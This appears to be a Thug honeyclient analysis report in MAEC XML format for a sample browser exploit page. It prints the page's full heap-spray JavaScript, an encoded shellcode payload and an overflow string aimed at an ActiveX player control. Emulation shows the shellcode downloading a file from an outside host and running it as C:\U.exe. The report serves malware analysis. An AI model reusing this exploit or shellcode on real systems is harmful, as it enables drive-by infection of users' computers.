<MAEC_Bundle xmlns:ns1="http://xml/metadataSharing.xsd" xmlns="http://maec.mitre.org/XMLSchema/maec-core-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd" id="maec:thug:bnd:1" schema_version="1.100000">
    <Analyses>
        <Analysis start_datetime="2012-12-11 20:59:23.567873" id="maec:thug:ana:2" analysis_method="Dynamic">
            <Subject>
                <Object object_name="http://127.0.0.1/thug/samples/./exploits/qvod.html" type="URI" id="maec:thug:obj:3">
                    <Associated_Code>
                        <Associated_Code_Snippet>
                            <Code_Snippet language="Javascript" id="maec:thug:cde:7">
                                <Discovery_Method tool_id="maec:thug:tol:6" method="Dynamic Analysis"/>
                                <Code_Segment>
					
					var Cuteqqaddress;
					Cuteqqaddress = 0x05050505;
					var EvilCute;
					EvilCute = window['unescape']("%u90"+"90" +
					"%u9090%u54eb%u758b%u8b3c%u3574" +
					"%u0378%u56f5%u768b%u0320%u33f5" +
					"%u49c9%uad41%udb33%u0f36%u14be" +
					"%u3828%u74f2%uc108%u0dcb%uda03" +
					"%ueb40%u3bef%u75df%u5ee7%u5e8b" +
					"%u0324%u66dd%u0c8b%u8b4b%u1c5e" +
					"%udd03%u048b%u038b%uc3c5%u7275" +
					"%u6d6c%u6e6f%u642e%u6c6c%u4300" +
					"%u5c3a%u2e55%u7865%u0065%uc033" +
					"%u0364%u3040%u0c78%u408b%u8b0c" +
					"%u1c70%u8bad%u0840%u09eb%u408b" +
					"%u8d34%u7c40%u408b%u953c%u8ebf" +
					"%u0e4e%ue8ec%uff84%uffff%uec83" +
					"%u8304%u242c%uff3c%u95d0%ubf50" +
					"%u1a36%u702f%u6fe8%uffff%u8bff" +
					"%u2454%u8dfc%uba52%udb33%u5353" +
					"%ueb52%u5324%ud0ff%ubf5d%ufe98" +
					"%u0e8a%u53e8%uffff%u83ff%u04ec" +
					"%u2c83%u6224%ud0ff%u7ebf%ue2d8" +
					"%ue873%uff40%uffff%uff52%ue8d0" +
					"%uffd7%uffff%u7468%u7074%u2f3a%u772f%u7777%u332e%u3036%u632e%u2e6e%u7873%u7378%u706e%u2e32%u6e63%u642f%u2e35%u7363%u0073");
					var Cuteqqsize;
					Cuteqqsize = 0x400000;
					var CuteqqLoadSize;
					var Cuteqquser;
					CuteqqLoadSize = EvilCute["length"] * 2;
					var spraySlideSize = Cuteqqsize - (CuteqqLoadSize+0x38);
					var Cuteqq_Slide = unescape("%u0505%u0505");
					Cuteqq_Slide = Cuteqq_Get_Slide(Cuteqq_Slide,spraySlideSize);
					heapBlocks = (Cuteqqaddress - 0x400000)/Cuteqqsize;
					Cuteqqtools = Cuteqq_Slide + EvilCute;
					cuteqqs = new window["Array"]();
					for (i=0;i&lt;heapBlocks;i++)
					{
					cuteqqs[i] = Cuteqqtools;
					}
					try
					{
					var a=new Array(813);
					var b=new Array(227);
					a=a+"aaaa";
					a=a+b+"\x61\x30\x19\x77\x61\x30\x19\x77\x61\x30\x19\x77\x61\x30\x19\x77\x61\x30\x19\x77\x61\x30\x19\x77\x61\x30\x19\x77\x61\x30\x19\x77\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x6A\x4E\x38\x18\x77\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x76\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x63\x4E";
					a=a+"\x4E\x38\x18\x77\x56\x38\x64\x20\x4A\x6B\x49\x6B\x42\x42\x73\x28\x73\x73\x26\x68\x73\x46\x46\x52\x45\x43\x43\x76\x50\x41\x51\x64\x73\x65\x7A\x78\x43\x44\x44\x66\x25\x34\x73\x73\x23";
					
					Cuteqqcn.URL=a;
					}
					catch(e){}
					function Cuteqq_Get_Slide(Cuteqq_Slide, spraySlideSize)
					{
					while (Cuteqq_Slide["length"]*2&lt;spraySlideSize)
					{
					Cuteqq_Slide += Cuteqq_Slide;
					}
					Cuteqq_Slide = Cuteqq_Slide["substring"](0,spraySlideSize/2);
					return Cuteqq_Slide;
					}
				</Code_Segment>
                            </Code_Snippet>
                            <Nature_Of_Relationship>Contained_Inside</Nature_Of_Relationship>
                        </Associated_Code_Snippet>
                        <Associated_Code_Snippet>
                            <Code_Snippet language="Assembly" id="maec:thug:cde:9">
                                <Discovery_Method tool_id="maec:thug:tol:8" method="Static Analysis"/>
                                <Code_Segment>
					HMODULE LoadLibraryA (
					     LPCTSTR = 0x02a394f0 =&gt; 
					           = "urlmon.dll";
					) =  0x7df20000;
					HRESULT URLDownloadToFile (
					     LPUNKNOWN = 0x02a3cf90 =&gt; 
					         none;
					     LPCTSTR = 0x02a3cfd0 =&gt; 
					           = "http://www.360.cn.sxxsnp2.cn/d5.css";
					     LPCTSTR = 0x02a3e960 =&gt; 
					           = "C:\U.exe";
					     DWORD dwReserved = 0;
					     LPBINDSTATUSCALLBACK lpfnCB = 0;
					) =  0x800c0008;
					UINT WINAPI WinExec (
					     LPCSTR = 0x02a3c5f0 =&gt; 
					           = "C:\U.exe";
					     UINT uCmdShow = -1869574000;
					) =  0x20;
					void ExitProcess (
					     UINT uExitCode = 0;
					) =  0x0;
				</Code_Segment>
                            </Code_Snippet>
                            <Nature_Of_Relationship>Shellcode</Nature_Of_Relationship>
                        </Associated_Code_Snippet>
                    </Associated_Code>
                    <Internet_Object_Attributes>
                        <URI>http://127.0.0.1/thug/samples/./exploits/qvod.html</URI>
                    </Internet_Object_Attributes>
                </Object>
            </Subject>
            <Tools_Used>
                <Tool id="maec:thug:tol:1">
                    <Name>Thug</Name>
                    <Version>0.4.9</Version>
                    <Organization>The Honeynet Project</Organization>
                </Tool>
            </Tools_Used>
        </Analysis>
    </Analyses>
    <Behaviors>
        <Behavior id="maec:thug:bhv:4">
            <Description>
                <Text>[HTTP] URL: http://127.0.0.1/thug/samples/./exploits/qvod.html (Status: 200, Referrer: None)</Text>
            </Description>
            <Discovery_Method tool_id="maec:thug:tol:5" method="Dynamic Analysis"/>
        </Behavior>
    </Behaviors>
    <Pools/>
</MAEC_Bundle>
